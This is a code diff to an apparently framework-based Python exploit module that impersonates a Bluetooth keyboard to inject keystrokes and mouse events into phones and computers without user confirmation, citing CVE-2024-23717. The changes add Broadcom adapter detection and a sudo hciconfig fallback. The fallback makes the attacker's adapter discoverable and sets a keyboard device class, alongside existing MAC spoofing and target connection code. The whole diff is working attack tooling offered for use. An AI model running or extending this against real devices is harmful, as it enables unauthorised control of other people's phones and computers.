@@ -8,15 +8,17 @@ allowing injection of arbitrary keystrokes and mouse events without
 user confirmation.
 
 Supports: Android, Linux, macOS (with spoofed MAC), iOS, Windows.
-Requires: Linux with BlueZ, pybluez, pydbus, bdaddr (for MAC spoofing).
+Requires: Linux with BlueZ userspace tools (hciconfig/btmgmt), pybluez,
+pydbus, and optional bdaddr (for MAC spoofing).
 
 Improvements incorporated from upstream hi_my_name_is_keyboard:
   - Mouse HID report support (issue #17)
   - Handle spaces in Bluetooth name (PR #2)
   - CVE-2024-23717 coverage (Android 14 variant, issue #20)
   - Linux pairing fixes (issue #6)
+  - Broadcom adapter fallback handling (issue #8)
 
-Version: 1.1.0
+Version: 1.2.0
 """
 
 from __future__ import annotations
@@ -363,7 +365,8 @@ class HIDKeyboardClient:
 
 def _configure_adapter(hci: str, name: str = "WXF Keyboard",
                        spoof_mac: str = "",
-                       device_class: int = BT_CLASS_KEYBOARD) -> None:
+                       device_class: int = BT_CLASS_KEYBOARD,
+                       broadcom_fallback: bool = False) -> None:
     """Configure Bluetooth adapter for HID device impersonation.
 
     Handles names with spaces via proper list-based subprocess arguments.
@@ -391,6 +394,23 @@ def _configure_adapter(hci: str, name: str = "WXF Keyboard",
         )
     except Exception as err:
         logger.error("Adapter configuration failed: %s", err)
+        if broadcom_fallback:
+            logger.warning("Applying Broadcom fallback configuration on %s", hci)
+            for fallback_cmd in (
+                ["sudo", "hciconfig", hci, "up"],
+                ["sudo", "hciconfig", hci, "piscan"],
+                ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(device_class)],
+                ["sudo", "hciconfig", hci, "name", name],
+            ):
+                try:
+                    subprocess.run(
+                        fallback_cmd,
+                        check=False,
+                        capture_output=True,
+                        timeout=5,
+                    )
+                except Exception:
+                    pass
 
     if spoof_mac and shutil.which("bdaddr"):
         try:
@@ -457,6 +477,23 @@ class Exploit(Exploit):
     key_delay = OptFloat(0.02, "Delay between keystrokes (seconds)")
     dry_run = OptBool(False, "Show configuration without executing")
 
+    def _is_broadcom_adapter(self) -> bool:
+        """Detect Broadcom adapters that may need relaxed setup path."""
+        try:
+            result = subprocess.run(
+                ["hciconfig", "-a", self.hci_device],
+                capture_output=True,
+                text=True,
+                check=False,
+                timeout=5,
+            )
+            if result.returncode != 0:
+                return False
+            output = result.stdout.lower()
+            return ("broadcom" in output) or ("manufacturer: broadcom" in output)
+        except Exception:
+            return False
+
     def _inject_demo_tabs(self, client: HIDKeyboardClient, duration: float = 5.0) -> None:
         """Inject Tab keystrokes for demonstration."""
         end_time = time.monotonic() + duration
@@ -520,8 +557,12 @@ class Exploit(Exploit):
                      else BT_CLASS_KEYBOARD)
 
         print_status("Configuring adapter {}...".format(self.hci_device))
+        is_broadcom = self._is_broadcom_adapter()
+        if is_broadcom:
+            print_info("Broadcom adapter detected: enabling fallback setup path.")
         _configure_adapter(self.hci_device, spoof_mac=self.spoof_mac,
-                           device_class=dev_class)
+                           device_class=dev_class,
+                           broadcom_fallback=is_broadcom)
 
         print_status("Connecting to {} ({})...".format(
             self.target_address, self.target_os))
